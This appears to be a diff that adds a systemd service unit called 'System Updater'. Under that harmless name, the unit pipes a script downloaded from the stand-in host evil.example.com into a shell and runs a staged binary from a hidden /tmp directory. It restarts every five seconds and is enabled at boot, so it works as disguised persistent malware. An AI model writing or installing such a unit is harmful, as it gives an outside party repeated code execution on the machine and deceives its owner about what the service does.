@@ -1,0 +1,13 @@
+[Unit]
+Description=System Updater
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'curl http://evil.example.com/payload | sh'
+ExecStartPre=/tmp/.hidden/stage1
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
